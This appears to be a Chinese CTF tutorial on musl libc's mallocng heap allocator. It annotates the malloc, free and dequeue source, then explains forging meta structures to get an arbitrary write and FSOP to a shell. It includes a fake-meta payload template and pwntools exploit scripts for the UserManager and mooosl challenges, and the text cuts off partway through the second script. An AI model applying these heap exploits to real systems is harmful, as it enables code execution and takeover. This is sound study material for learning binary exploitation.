*meta_area_head, *meta_area_tail; // 分别指向第一个和最后一个 meta_area unsigned char *avail_meta_areas; struct meta *active[48]; // 可以分配的 meta 地址，idx 对应着 size_classes 的大小，类似 glibc 的 bins size_t usage_by_class[48]; // idx 对应大小的所有 meta 的 chunk 数量 uint8_t unmap_seq[32], bounces[32]; uint8_t seq; uintptr_t brk; // 记录目前的 brk(0)}; 位于 libc 的数据段，为全局结构体 secret 防止伪造 meta free_meta_head 指向 freed_meta 头 avail_meta 指向可用 meta 数组 active 指向一个 meta 双向链表，其中的 meta 一般都有 unuse_chunk idx 对应着 size_classes 的大小，类似 glibc 的 bins 指向的第一个 meta 一般有 avail_chunk，后面的 meta 一般只有 freed_chunk usage_by_class idx 对应大小的所有 meta 的 group 管理的 chunk 数量 brk 记录目前的 brk(0) chunk -&gt; meta./src/malloc/mallocng/meta.h1234567891011121314151617181920212223242526272829303132static inline struct meta *get_meta(const unsigned char *p){ assert(!((uintptr_t)p &amp; 15)); int offset = *(const uint16_t *)(p - 2); int index = get_slot_index(p); if (p[-4]) { assert(!offset); offset = *(uint32_t *)(p - 8); assert(offset &gt; 0xffff); } const struct group *base = (const void *)(p - UNIT*offset - UNIT); const struct meta *meta = base-&gt;meta; /* check */ assert(meta-&gt;mem == base); assert(index &lt;= meta-&gt;last_idx); assert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index))); assert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index))); const struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096); assert(area-&gt;check == ctx.secret); if (meta-&gt;sizeclass &lt; 48) { assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index); assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)); } else { assert(meta-&gt;sizeclass == 63); } if (meta-&gt;maplen) { assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1); }/* end */ return (struct meta *)meta;} 取 chunk 的 idx 和 offset 通过 offset 取 group 通过 group-&gt;meta 取 meta 各种检查 meta-&gt;mem == group idx &lt;= meta-&gt;last_idx meta 的 mask 上 idx 对应的位置是否都为 0 meta_area-&gt;check == malloc_context.secret size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1) 大概总结一下 malloc_context 作为全局变量，在 libc 数据段 meta_area 作为 meta 的集合，管理着 meta 同类型 且 有可分配 chunk 的 meta 以双向链表形式连接起来，如果 meta 的 chunk 全部分配出去，则会从双向链表中移出 malloc 时，通过 malloc_context 的 active 寻找对应大小的可使用的 meta，类似 glibc 的 bins malloc_context 的 active 指向的第一个 meta 一般是有 avail_chunk 或者 freed_chunk（或所有 chunk 刚好分配完），此 meta 后面的 meta 一般只有 freed_chunk malloc_context 的 freed_meta_head 指向 freed_meta 链表 mallocmalloc./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108void *malloc(size_t n){ if (size_overflows(n)) return 0; struct meta *g; uint32_t mask, first; // sizeclass int sc; int idx; int ctr; // mmap 分配 // #define MMAP_THRESHOLD 131052 if (n &gt;= MMAP_THRESHOLD) { size_t needed = n + IB + UNIT; void *p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) return 0; wrlock(); step_seq(); g = alloc_meta(); if (!g) { unlock(); munmap(p, needed); return 0; } g-&gt;mem = p; g-&gt;mem-&gt;meta = g; g-&gt;last_idx = 0; g-&gt;freeable = 1; g-&gt;sizeclass = 63; g-&gt;maplen = (needed+4095)/4096; g-&gt;avail_mask = g-&gt;freed_mask = 0; // use a global counter to cycle offset in // individually-mmapped allocations. ctx.mmap_counter++; idx = 0; goto success; } // 根据 n 取 size_classes 对应大小的下标 sc = size_to_class(n); rdlock(); /* 寻找合适的 meta */ // 获取对应大小的 meta g = ctx.active[sc]; // use coarse size classes initially when there are not yet // any groups of desired size. this allows counts of 2 or 3 // to be allocated at first rather than having to start with // 7 or 5, the min counts for even size classes. // 如果没有对应的 meta，且 4 &lt;= sc &lt; 32 且 sc !=6 且 sc 为偶数 且对应大小的所有 chunk 数量为 0 if (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) { // 使用更大一点（sc+1）的 meta size_t usage = ctx.usage_by_class[sc|1]; // if a new group may be allocated, count it toward // usage in deciding if we can use coarse class. // 如果 sc+1 对应的 meta 也不存在或存在但没有可用的 chunk 则 usage+3 if (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask)) usage += 3; // 如果 usage &lt;= 12 则 sc+1 if (usage &lt;= 12) sc |= 1; g = ctx.active[sc]; }/* end *//* 寻找可分配的 chunk */ for (;;) { mask = g ? g-&gt;avail_mask : 0; // 取最低位的 1，即取可用的 idx 最小的 chunk，没有则为 0 first = mask&amp;-mask; // 若无可用 chunk，则跳出循环 if (!first) break; // 若没有其他问题，则在 avail_mask 中将对应 chunk 的那一 bit 位置零 if (RDLOCK_IS_EXCLUSIVE || !MT) g-&gt;avail_mask = mask-first; else if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) continue; // 计算出对应的 chunk idx idx = a_ctz_32(first); goto success; } upgradelock(); // 如果没有合适的 chunk，则进一步分配，获取 chunk 下标 idx = alloc_slot(sc, n); if (idx &lt; 0) { unlock(); return 0; } // 更新为即将使用的 meta g = ctx.active[sc];/* end */ success: ctr = ctx.mmap_counter; unlock(); return enframe(g, idx, n, ctr);} 将 size 转化为对应的 size_classes 的下标 sc 取 ctx.active[sc] 第一个 meta，取其 avail_mask 中 idx 最小的 chunk 如果没有则进入 alloc_slot 做进一步分配 alloc_slot./src/malloc/mallocng/malloc.c12345678910111213static int alloc_slot(int sc, size_t req){ uint32_t first = try_avail(&amp;ctx.active[sc]); if (first) return a_ctz_32(first); // 如果链表中都没有可用的 chunk，则重新申请一个 group struct meta *g = alloc_group(sc, req); if (!g) return -1; g-&gt;avail_mask--; queue(&amp;ctx.active[sc], g); return 0;} 进入 try_avail 尝试从 ctx.active[sc] 对应的 meta 链表中寻找可分配的 chunk 没有则进入 alloc_group 再申请一个 meta 和 group try_avail./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869static uint32_t try_avail(struct meta **pm){ struct meta *m = *pm; uint32_t first; if (!m) return 0; uint32_t mask = m-&gt;avail_mask; // 若没有可分配的 chunk if (!mask) { if (!m) return 0; if (!m-&gt;freed_mask) { /* 且也没有 freed chunk，即 group 中的 chunk 都是 inuse 则将该 meta 从 ctx.active[sc] 和 双向链表中移除 */ dequeue(pm, m); m = *pm; if (!m) return 0; } else { // 优先使用下一个 meta 的 freed_chunk m = m-&gt;next; *pm = m; } mask = m-&gt;freed_mask; // skip fully-free group unless it's the only one // or it's a permanently non-freeable group // 跳过所有 chunk 都是 freed_chunk 且可 free 的 meta，一般不会出现这个情况 if (mask == (2u&lt;&lt;m-&gt;last_idx)-1 &amp;&amp; m-&gt;freeable) { m = m-&gt;next; *pm = m; mask = m-&gt;freed_mask; } // activate more slots in a not-fully-active group // if needed, but only as a last resort. prefer using // any other group with free slots. this avoids // touching &amp; dirtying as-yet-unused pages. /* 总结起来就是，如果第一个 meta 的 chunk 都是 inuse， 且第二个 meta 的 freed_chunk 使用完了，才进入下面的操作 可能是什么特殊情况，正常不会出现这个情况*/ if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1))) { if (m-&gt;next != m) { m = m-&gt;next; *pm = m; } else { int cnt = m-&gt;mem-&gt;active_idx + 2; int size = size_classes[m-&gt;sizeclass]*UNIT; int span = UNIT + size*cnt; // activate up to next 4k boundary while ((span^(span+size-1)) &lt; 4096) { cnt++; span += size; } if (cnt &gt; m-&gt;last_idx+1) cnt = m-&gt;last_idx+1; m-&gt;mem-&gt;active_idx = cnt-1; } } // 将 freed_mask 转为 avail_mask mask = activate_group(m); assert(mask); decay_bounces(m-&gt;sizeclass); } first = mask&amp;-mask; m-&gt;avail_mask = mask-first; return first;} 若 active 第一个 meta 的 chunk 都是 inuse，则将此 meta 从 active 和 链表中移出 将 active 第一个 meta 设置为下一个 meta 将其 freed_mask 转为 avail_mask 使用 取 avail_mask 中 idx 最小的 chunk queue./src/malloc/mallocng/meta.h1234567891011121314static inline void queue(struct meta **phead, struct meta *m){ assert(!m-&gt;next); assert(!m-&gt;prev); if (*phead) { struct meta *head = *phead; m-&gt;next = head; m-&gt;prev = head-&gt;prev; m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m; } else { m-&gt;prev = m-&gt;next = m; *phead = m; }} dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} 如果能够伪造 meta，可以任意地址写 alloc_group./src/malloc/mallocng/malloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123static struct meta *alloc_group(int sc, size_t req){ size_t size = UNIT*size_classes[sc]; int i = 0, cnt; unsigned char *p; // 优先寻找 freed_meta，将其从 ctx.free_meta_head 移除 // 若没有就从 meta_area 中按地址从低到高顺序取一个 // 如果 meta_area 满了，则再申请一个 meta_area // 会将 meta 的 prev，next 置零 struct meta *m = alloc_meta(); if (!m) return 0; size_t usage = ctx.usage_by_class[sc]; size_t pagesize = PGSZ; int active_idx; /* 设置 cnt，也就是 group 能容纳 chunk 最大数量 */ if (sc &lt; 9) { while (i&lt;2 &amp;&amp; 4*small_cnt_tab[sc][i] &gt; usage) i++; cnt = small_cnt_tab[sc][i]; } else { // lookup max number of slots fitting in power-of-two size // from a table, along with number of factors of two we // can divide out without a remainder or reaching 1. cnt = med_cnt_tab[sc&amp;3]; // reduce cnt to avoid excessive eagar allocation. while (!(cnt&amp;1) &amp;&amp; 4*cnt &gt; usage) cnt &gt;&gt;= 1; // data structures don't support groups whose slot offsets // in units don't fit in 16 bits. while (size*cnt &gt;= 65536*UNIT) cnt &gt;&gt;= 1; }/* end */ // If we selected a count of 1 above but it's not sufficient to use // mmap, increase to 2. Then it might be; if not it will nest. if (cnt==1 &amp;&amp; size*cnt+UNIT &lt;= pagesize/2) cnt = 2; // All choices of size*cnt are &quot;just below&quot; a power of two, so anything // larger than half the page size should be allocated as whole pages. if (size*cnt+UNIT &gt; pagesize/2) { // check/update bounce counter to start/increase retention // of freed maps, and inhibit use of low-count, odd-size // small mappings and single-slot groups if activated. int nosmall = is_bouncing(sc); account_bounce(sc); step_seq(); // since the following count reduction opportunities have // an absolute memory usage cost, don't overdo them. count // coarse usage as part of usage. if (!(sc&amp;1) &amp;&amp; sc&lt;32) usage += ctx.usage_by_class[sc+1]; // try to drop to a lower count if the one found above // increases usage by more than 25%. these reduced counts // roughly fill an integral number of pages, just not a // power of two, limiting amount of unusable space. if (4*cnt &gt; usage &amp;&amp; !nosmall) { if (0); else if ((sc&amp;3)==1 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 2; else if ((sc&amp;3)==2 &amp;&amp; size*cnt&gt;4*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;8*pagesize) cnt = 3; else if ((sc&amp;3)==0 &amp;&amp; size*cnt&gt;2*pagesize) cnt = 5; } size_t needed = size*cnt + UNIT; needed += -needed &amp; (pagesize-1); // produce an individually-mmapped allocation if usage is low, // bounce counter hasn't triggered, and either it saves memory // or it avoids eagar slot allocation without wasting too much. if (!nosmall &amp;&amp; cnt&lt;=7) { req += IB + UNIT; req += -req &amp; (pagesize-1); if (req&lt;size+UNIT || (req&gt;=4*pagesize &amp;&amp; 2*cnt&gt;usage)) { cnt = 1; needed = req; } } p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0); if (p==MAP_FAILED) { free_meta(m); return 0; } m-&gt;maplen = needed&gt;&gt;12; ctx.mmap_counter++; active_idx = (4096-UNIT)/size-1; if (active_idx &gt; cnt-1) active_idx = cnt-1; if (active_idx &lt; 0) active_idx = 0; } else { int j = size_to_class(UNIT+cnt*size-IB); // 从大 group 中申请小 group，大 group 的 chunk 作为整个小 group，是一个递归过程 int idx = alloc_slot(j, UNIT+cnt*size-IB); if (idx &lt; 0) { free_meta(m); return 0; } struct meta *g = ctx.active[j]; p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter); m-&gt;maplen = 0; p[-3] = (p[-3]&amp;31) | (6&lt;&lt;5); for (int i=0; i&lt;=cnt; i++) p[UNIT+i*size-4] = 0; active_idx = cnt-1; } // 增加可用 chunk 个数 ctx.usage_by_class[sc] += cnt; // 初始化 meta 和 group m-&gt;avail_mask = (2u&lt;&lt;active_idx)-1; m-&gt;freed_mask = (2u&lt;&lt;(cnt-1))-1 - m-&gt;avail_mask; m-&gt;mem = (void *)p; m-&gt;mem-&gt;meta = m; // group 的 active_idx 和 meta 的 last_idx 一般是相等的，为 cnt-1 m-&gt;mem-&gt;active_idx = active_idx; m-&gt;last_idx = cnt-1; m-&gt;freeable = 1; m-&gt;sizeclass = sc; return m;} emframe./src/malloc/mallocng/meta.h123456789101112131415161718192021222324252627282930313233343536373839404142434445static inline void *enframe(struct meta *g, int idx, size_t n, int ctr){ // 获取 chunk 大小 size_t stride = get_stride(g); // 计算 chunk 多余空间 size_t slack = (stride-IB-n)/UNIT; // p 指向 chunk 的 data 起始位置 unsigned char *p = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = p+stride-IB; // cycle offset within slot to increase interval to address // reuse, facilitate trapping double-free./* check */ // p[-3] = chunk_idx // *(uint16_t *)(p-2) = chunk_offset // 取 chunk 的 offset，一般为 0 int off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) &amp; 255; assert(!p[-4]); if (off &gt; slack) { size_t m = slack; m |= m&gt;&gt;1; m |= m&gt;&gt;2; m |= m&gt;&gt;4; off &amp;= m; if (off &gt; slack) off -= slack+1; assert(off &lt;= slack); } if (off) { // store offset in unused header at offset zero // if enframing at non-zero offset. *(uint16_t *)(p-2) = off; p[-3] = 7&lt;&lt;5; p += UNIT*off; // for nonzero offset there is no permanent check // byte, so make one. p[-4] = 0; }/* end */ // 设置 offset 和 idx *(uint16_t *)(p-2) = (size_t)(p-g-&gt;mem-&gt;storage)/UNIT; p[-3] = idx; // 设置 reserved set_size(p, end, n); return p;} 总结一下以下为一般情况的流程，省略了特殊情况 检查申请的 size 如果 size 达到需要 mmap 的阈值 直接调用 mmap，返回的地址作为 group 获取并初始化 meta last_idx = 0，只有一个 chunk，因此它不会再 ctx.active 中 sizeclass = 63 maplen = (size + 4 + 0x10 + 4095) / 4096 avail_mask = freed_mask = 0 ctx.mmap_counter++ 进入 success 没有则调用 size_to_class 将 size 计算为对应的 sc（sizeclass） 获取对应的 meta 取 sc 对应大小的可分配的 meta（ctx.active[sc]) 若不存在满足下列所有条件会取稍大一点的 meta 4&lt;= sc &lt;32 sc != 6 sc 为偶数 对应大小的所有 chunk 数量为 0（没有对应大小的 meta） 获取 chunk 的 idx 取 meta 的第一个 avail_chunk 若 avail_chunk 存在 将 avail_mask 上对应的位置置零 进入 success 进入 alloc_slot 进行进一步申请 调用 try_avail 尝试 ctx.active[sc] 链表中的所有 meta 检查第一个 meta 的 freed_mask 若 freed_mask 为 0，会调用 **dequeue**，将其移除 ctx.active[sc] 因为第一个 meta 没有 unuse_chunk 将下一个 meta 切换为第一个 meta（ctx.active[sc] = m-&gt;next) 将 meta 的 freed_mask 转为 avail_mask 取 meta 的第一个 avail_chunk，将 avail_mask 上对应的位置置零 返回第一个 avail_chunk 对应的 avail_mask 位置 注：下一个 meta 可能是它自己（循环），如果没有 unused_mask，最终会返回 0 如果 try_avail 返回 0，会调用 alloc_group 申请一个新的 group 先调用 alloc_meta 申请一个 meta，优先取 freed_meta 再从 meta_area 中取新的 新的 group 一般取更大的 chunk 作为整个 group，是一个递归过程 meta 的 avail_mask 减一，即使用第一个 chunk 调用 queue 将 meta 放入 ctx.active[sc] 进入 success 调用 enframe 对 chunk 初始化 (unsigned char*) p[-3] = idx *(uint16_t) (p - 2) = offset 设置 reserved 总结简单版分配 chunk 顺序 ctx.active[sc] -&gt; avail_mask malloc_context.active 对应大小的 meta 中的 avail_chunk ctx.active[sc] -&gt; next -&gt; freed_mask malloc_context.active 对应大小的 meta 的 下一个 meta 中的 freed_chunk 如果 ctx.active[sc] 的 chunk 都是 inuse，则会调用 **dequeue**，将其移出 active 和链表 先把 freed_mask 转为 avail_mask，然后将 ctx.active[sc] 设为该 meta ctx.active[sc] -&gt; freed_mask malloc_context.active 对应大小的 meta 中的 freed_chunk new_meta -&gt; avail_mask 申请一个新的 meta，取其 avail_chunk freefree./src/malloc/mallocng/free.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546void free(void *p){ if (!p) return; struct meta *g = get_meta(p); int idx = get_slot_index(p); size_t stride = get_stride(g); unsigned char *start = g-&gt;mem-&gt;storage + stride*idx; unsigned char *end = start + stride - IB; // 检查 reserved get_nominal_size(p, end); uint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1; // idx 和 reserved 置 0xff，offset 置 0 ((unsigned char *)p)[-3] = 255; // invalidate offset to group header, and cycle offset of // used region within slot if current offset is zero. *(uint16_t *)((char *)p-2) = 0; // release any whole pages contained in the slot to be freed // unless it's a single-slot group that will be unmapped. if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) { unsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1)); size_t len = (end-base) &amp; -PGSZ; if (len) madvise(base, len, MADV_FREE); } // atomic free without locking if this is neither first or last slot for (;;) { uint32_t freed = g-&gt;freed_mask; uint32_t avail = g-&gt;avail_mask; uint32_t mask = freed | avail; assert(!(mask&amp;self)); // 如果没有 freed_chunk 或者都是 unuse_chunk，则跳出循环 if (!freed || mask+self==all) break; if (!MT) g-&gt;freed_mask = freed+self; else if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed) continue; return; } wrlock(); struct mapinfo mi = nontrivial_free(g, idx); unlock(); if (mi.len) munmap(mi.base, mi.len);} 如果其他 chunk 都不是 freed_chunk 或者都是 unuse_chunk 则会 进入 nontrivial_free nontrivial_free./src/malloc/mallocng/free.c1234567891011121314151617181920212223242526272829303132static struct mapinfo nontrivial_free(struct meta *g, int i){ uint32_t self = 1u&lt;&lt;i; int sc = g-&gt;sizeclass; uint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask; // 一般情况，只要所有 chunk 都是 unuse，就会 free meta 和 group if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) { // any multi-slot group is necessarily on an active list // here, but single-slot groups might or might not be. if (g-&gt;next) { assert(sc &lt; 48); int activate_new = (ctx.active[sc]==g); dequeue(&amp;ctx.active[sc], g); // 将下一个 meta 的 freed_chunk 转为 avail_chunk if (activate_new &amp;&amp; ctx.active[sc]) activate_group(ctx.active[sc]); } return free_group(g); } else if (!mask) { // 如果 meta 不在 active 里，则放入 actvie 中 assert(sc &lt; 48); // might still be active if there were no allocations // after last available slot was taken. if (ctx.active[sc] != g) { queue(&amp;ctx.active[sc], g); } } // g-&gt;freed_mask = g-&gt;free_mask &amp; self a_or(&amp;g-&gt;freed_mask, self); return (struct mapinfo){ 0 };} 所有 chunk 都是 unuse_chunk 将该 meta 从 active 和链表中移除 将链表的下一个 meta 的 freed_chunk 转为 avail_chunk free 该 meta 和 group 没有 freed_chunk 将该 meta 插入 active 的链表尾部 free_group./src/malloc/mallocng/free.c1234567891011121314151617181920212223static struct mapinfo free_group(struct meta *g){ struct mapinfo mi = { 0 }; int sc = g-&gt;sizeclass; if (sc &lt; 48) { ctx.usage_by_class[sc] -= g-&gt;last_idx+1; } if (g-&gt;maplen) { step_seq(); record_seq(sc); mi.base = g-&gt;mem; mi.len = g-&gt;maplen*4096UL; } else { void *p = g-&gt;mem; struct meta *m = get_meta(p); int idx = get_slot_index(p); g-&gt;mem-&gt;meta = 0; // not checking size/reserved here; it's intentionally invalid mi = nontrivial_free(m, idx); } free_meta(g); return mi;} 总结一下 获取 chunk 的 meta、idx、sc 检查 reserved idx 和 reserved 置为 0xff，offset 置零 检查 avail_mask 和 freed_mask 若存在 freed_chunk 且有其他的 inuse_chunk 将 freed_mask 上该 chunk 对应的位置设为 1 结束 free 函数 否则进入下一步 调用 nontrivial_free 函数做进一步处理 如果所有 chunk 都是 unuse_chunk 如果 meta 的 next 存在，调用 dequeue 将 meta 从 ctx.active[sc] 中移出 free 掉 meta 和 group 结束 free 函数 如果其他 chunk 都是 inuse_chunk 且 meta 不在 ctx.artive[sc] 中 调用 queue 将 meta 放入 ctx.active[sc] 将 freed_mask 上该 chunk 对应的位置设为 1 关键dequeue./src/malloc/mallocng/meta.h1234567891011static inline void dequeue(struct meta **phead, struct meta *m){ if (m-&gt;next != m) { m-&gt;prev-&gt;next = m-&gt;next; m-&gt;next-&gt;prev = m-&gt;prev; if (*phead == m) *phead = m-&gt;next; } else { *phead = 0; } m-&gt;prev = m-&gt;next = 0;} 几乎没有任何检查，如果能够伪造 meta，可以任意地址写 调用途径 malloc -&gt; try_avail -&gt; dequeue free -&gt; nontrivial_free -&gt; dequeue 利用 泄露一些重要信息 大部分都可以从 malloc_context 中获取 libc 基址 secret 伪造 meta_area、area、group、chunk 下面是一些伪造的硬性要求或者建议 meta_area 因为 get_meta 时会检查 secret 防止伪造，而检查时取 meta_area 地址是取 area 所在页的地址，因此伪造的 meta_area 地址后 12 位都要为 0，一般通过 mmap 伪造 check == malloc_context.secret area prev，next 改成想写的位置 mem == fake_group last_idx == 0，一般只需要伪造一个 chunk，这样 free fake_chunk 时直接能进入 nontrivial_free avail_mask，freed_mask 全为 0 即可（因为只有一个将要 free 的 fake_chunk） sc &lt; 48 freeable == 1 maplen != 0，否则在 free_group 会进行递归 free，随便取个值就行 group meta == fake_meta active_idx == 0 chunk 一般是 fake_fike 或者其他垃圾数据 下面的例子是将 ofl_head 指向 fake_chunk（fake_file），exit 时就可以导致 FSOP 12345678910111213141516171819202122last_idx = 0freeable = 1sc = 8maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(maplen &lt;&lt; 12 | sc &lt;&lt; 6 | freeable &lt;&lt; 5 | last_idx)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)# fake_filefake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1) # nsolts 2022 qwb UserManager这里只要会堆风水就行，不需要伪造就可以任意地址写一次 12345678910111213141516171819202122232425262728void __fastcall insert(User *newUser, User *users){ while ( users ) { // UAF if ( newUser-&gt;id == users-&gt;id ) { newUser-&gt;flag = users-&gt;flag; newUser-&gt;leftUser = users-&gt;leftUser; newUser-&gt;rightUser = users-&gt;rightUser; newUser-&gt;parentUser = users-&gt;parentUser; if ( users-&gt;leftUser ) users-&gt;leftUser-&gt;parentUser = newUser; if ( users-&gt;rightUser ) users-&gt;rightUser-&gt;parentUser = newUser; if ( users-&gt;parentUser != (User *)0xDEADBEEFLL ) { if ( users == users-&gt;parentUser-&gt;leftUser ) users-&gt;parentUser-&gt;leftUser = newUser; else users-&gt;parentUser-&gt;rightUser = newUser; } free(users-&gt;name); free(users); return; } ...} 在添加 user 的时候，如果有 id 相同的 user，会把原来的 user 释放掉，但是 users 会指向原来的 user，造成 UAF 先泄露出 libc 和 elf 地址 上面的第 13 行可以任意地址写一次，把 ofl_head 修改到可控位置 伪造 fake_file 最后 exit 进行 FSOP 最后写 fake_file 的时候要多次堆风水 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *# p = remote('', )p = process('./' + __file__[0:-3])context(arch='amd64', os='linux', log_level='debug')elf = ELF(__file__[0:-3])libc = ELF(&quot;./libc.so&quot;)addr_insert = elf.sym[&quot;insert&quot;]def add(id, length, name): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id)) p.recvuntil(b&quot;length: &quot;) p.sendline(str(length)) p.recvuntil(b&quot;UserName: &quot;) p.send(name)def check(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def delete(id): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;Id: &quot;) p.sendline(str(id))def clear(): p.recvuntil(b&quot;: &quot;) p.sendline(b&quot;4&quot;)def fengshui(times=1, length=0x8, name=&quot;aaad\\n&quot;, id=0): for _ in range(times): add(id, length, name) id += 1# gdb.attach(p)## leak addradd(0x100, 0x38, &quot;aaad\\n&quot;) # usersadd(0x100, 0x8, &quot;aaad\\n&quot;)fengshui(6)check(0x100)addr_elf = u64(p.recv(0x10)[-8:]) - 0x5ca0addr_libc = u64(p.recv(0x20)[-8:]) - 0xb7d60print(&quot;-&gt; addr_elf = &quot;, hex(addr_elf))print(&quot;-&gt; addr_libc = &quot;, hex(addr_libc))addr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xb6e48## write ofl_head to fake_fileclear()add(0x6873, 0x38, &quot;aaad\\n&quot;) # usersadd(0x6873, 0x8, &quot;aaad\\n&quot;)fengshui(6)fake_user = p64(0x6873) + p64(addr_libc + 0xb7a60) + p64(0) + p64(1) fake_user += p64(0xdeadbeef) + p64(addr_ofl_head - 0x20) + p64(0)add(0x6873, 0x38, fake_user) # user-&gt;name --&gt; users## construct fake_fileclear()# gdb.attach(p)add(0x6873, 0x38, p64(addr_system) * 7) # ofl_head[0] = &quot;sh&quot;add(0x100, 0x8, &quot;aaad\\n&quot;)add(0x100, 0x38, p64(0) * 7) # ofl_head-&gt;lock = 0fengshui(3)add(0x50, 0x38, p64(addr_system) * 7) # ofl_head-&gt;write = systemp.sendline()p.interactive() Defcon Quals 2021 mooosl用的本地 libc，musl 1.2.2-4 amd64 静态分析一个典型的菜单题，存储 KV 12345678struct KV { char *key; char *value; __int64 key_size; __int64 value_size; __int64 hash; KV *next_KV;}; store 每次存储一个 KV，再申请 key 和 value 内存，计算 key 的 hash，取 hash 后 12 位将其放入 hash_map 中，用单链表存储 hash 后 12 位相同的 KV，头插法 可用于堆风水 query 先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，输出 value 内容，最后将 key 内存 free 可用于 堆风水 delete 先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，进行删除 12345678910111213141516kv = search(key, key_size);if ( kv ){ chain = &amp;hash_map[kv-&gt;hash &amp; 0xFFF]; // 这里忽略了一个条件，当 kv 是链表尾的时候，上一个 kv 的 next_KV 没有置零，导致 UAF if ( kv == *chain || kv-&gt;next_KV ) { while ( kv != *chain ) chain = &amp;(*chain)-&gt;next_KV; *chain = kv-&gt;next_KV; } free(kv-&gt;key); free(kv-&gt;value); free(kv); puts(&quot;ok&quot;);} 利用点 申请两个 hash 后 12 位相同的 kv，delete 后面一个造成 UAF 通过堆风水和 query 泄露出重要信息 再通过堆风水和 delete，伪造 meta_area，通过 unsafe_unlink 任意地址写 主要是通过 delete 的 free(kv-&gt;key) 或 free(kv-&gt;value) 来 unlink 因为这两个指针可以任意写（笔者想了好久死活没想出来） 通过改写 ofl_head 指向伪造的 file 最后 exit 导致 FSOP 下面是看别人 wp 是做法，要写三次，伪造三次（逆天） 通过改写 stdout 的 write 函数指针为 system 和 flags 为 /bin/sh\\x00，并使 wpos != wbase 即可导致 FSOP 拿到 shell 思路很简单，但是 exp 是真的难写😭😭 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169from pwn import *context(arch='amd64', os='linux', log_level='debug')address = &quot;&quot;.split(':')filename = &quot;./&quot; + __file__[0:-3]elf = ELF(__file__[0:-3])# p = remote(address[0], address[1])p = process(__file__[0:-3])libc = ELF(&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;)def store(key, value, key_size=None, value_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key) p.recvuntil(b&quot;size: &quot;) if value_size == None : value_size = len(value) p.sendline(str(value_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(value)def query(key, key_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def delete(key, key_size=None): p.recvuntil(b&quot;option: 